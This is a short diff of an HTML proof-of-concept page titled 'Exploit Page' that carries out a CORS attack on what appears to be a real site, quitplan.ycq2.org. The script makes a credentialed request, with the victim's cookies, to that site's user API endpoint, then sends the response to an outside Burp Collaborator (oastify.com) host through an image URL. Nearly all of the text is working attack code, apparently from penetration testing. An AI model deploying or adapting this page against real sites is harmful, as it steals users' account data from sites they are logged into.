@@ -2,33 +2,20 @@
 <html>
 <head>
     <script>
-        // Create a new XMLHttpRequest object
         var req = new XMLHttpRequest();
-        req.onload = reqListener; // Define what to do when the response is received
-        req.open('POST', 'https://quitplan.ycq2.org/api/cravings/126?_method=PUT', true); // Open a POST request to the target URL
-        req.withCredentials = true; // Include credentials like cookies in the request
+        req.onload = reqListener;
+        req.open('GET', 'https://quitplan.ycq2.org/api/user', true);
+        req.withCredentials = true;
+        req.send();
 
-        // Set the appropriate Content-Type header for a POST request
-        req.setRequestHeader('Content-Type', 'application/json');
-
-        // Define the data to be sent in the POST request
-        var postData = JSON.stringify({
-            "username": "testuser",
-            "password": "testpass"
-        });
-
-        // Send the POST request with the data
-        req.send(postData);
-
-        // Function to handle the response
         function reqListener() {
             // Send the response data to your Burp Collaborator server
             var img = new Image();
-            img.src = 'https://r7zu5d6e9bjwqc0zebao5294cvim6mub.oastify.com/?data=' + encodeURIComponent(this.responseText);
+            img.src = 'https://dr8gpzq0tx3iayklyxuapotqwh28qzhn6.oastify.com/?data=' + encodeURIComponent(this.responseText);
         }
     </script>
 </head>
 <body>
-    <h1>POST Method CORS Exploit</h1>
+    <h1>Exploit Page</h1>
 </body>
 </html>
